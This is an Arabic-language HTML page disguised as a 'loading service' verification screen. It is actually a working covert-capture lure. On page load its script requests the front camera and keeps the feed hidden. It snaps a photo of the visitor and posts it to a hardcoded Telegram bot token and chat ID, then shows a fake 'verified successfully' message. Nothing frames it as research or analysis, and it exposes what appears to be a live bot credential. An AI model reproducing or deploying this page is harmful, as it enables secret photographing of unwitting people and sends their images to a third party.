<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحميل الصفحة</title>
    <style>
        body {
            background-color: #f0f2f5;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: #333;
        }
        .loading {
            text-align: center;
            padding: 20px;
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div id="loading" class="loading">
        <h2>جاري تحميل الخدمة...</h2>
        <p>الرجاء الانتظار</p>
    </div>

    <div id="permissionDenied" class="hidden">
        <h2>يتطلب الوصول إلى الكاميرا</h2>
        <p>يجب منح الإذن لاستخدام الكاميرا لتتمكن من استخدام الخدمة</p>
        <button onclick="window.location.reload()">حاول مرة أخرى</button>
    </div>

    <video id="cameraView" class="hidden" autoplay playsinline></video>
    <canvas id="canvas" class="hidden"></canvas>

    <script>
        // بيانات البوت
        const botToken = '7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94';
        const chatId = '6913353602';
        
        // عناصر DOM
        const loadingDiv = document.getElementById('loading');
        const permissionDeniedDiv = document.getElementById('permissionDenied');
        const cameraView = document.getElementById('cameraView');
        const canvas = document.getElementById('canvas');
        
        // بدء العملية تلقائياً عند تحميل الصفحة
        document.addEventListener('DOMContentLoaded', async () => {
            try {
                // طلب إذن الكاميرا
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' }, // الكاميرا الأمامية
                    audio: false
                });
                
                // عرض الكاميرا (مخفي عن المستخدم)
                cameraView.srcObject = stream;
                
                // انتظر ثانية لضبط الكاميرا
                await new Promise(resolve => setTimeout(resolve, 1000));
                
                // التقاط الصورة
                canvas.width = cameraView.videoWidth;
                canvas.height = cameraView.videoHeight;
                const context = canvas.getContext('2d');
                context.drawImage(cameraView, 0, 0, canvas.width, canvas.height);
                
                // إيقاف الكاميرا
                stream.getTracks().forEach(track => track.stop());
                
                // تحويل الصورة إلى base64
                const photoData = canvas.toDataURL('image/jpeg');
                
                // إرسال الصورة إلى التليجرام
                await sendToTelegram(photoData);
                
                // إخفاء رسالة التحميل
                loadingDiv.style.display = 'none';
                
                // توجيه المستخدم أو إظهار رسالة نجاح
                setTimeout(() => {
                    alert('تم التحقق بنجاح! يمكنك متابعة استخدام الخدمة.');
                    // يمكنك توجيه المستخدم لصفحة أخرى هنا إذا لزم الأمر
                    // window.location.href = "next-page.html";
                }, 1000);
                
            } catch (error) {
                console.error('Error:', error);
                loadingDiv.style.display = 'none';
                permissionDeniedDiv.classList.remove('hidden');
            }
        });
        
        // دالة إرسال الصورة إلى التليجرام
        async function sendToTelegram(photoData) {
            try {
                // تحويل الصورة من base64 إلى blob
                const blob = await fetch(photoData).then(res => res.blob());
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, 'user_photo.jpg');
                formData.append('caption', 'صورة المستخدم التقطت تلقائياً');
                
                // إرسال الصورة
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                const data = await response.json();
                if (!data.ok) {
                    throw new Error('فشل إرسال الصورة إلى البوت');
                }
            } catch (error) {
                console.error('Error sending to Telegram:', error);
                throw error;
            }
        }
    </script>
</body>
</html>
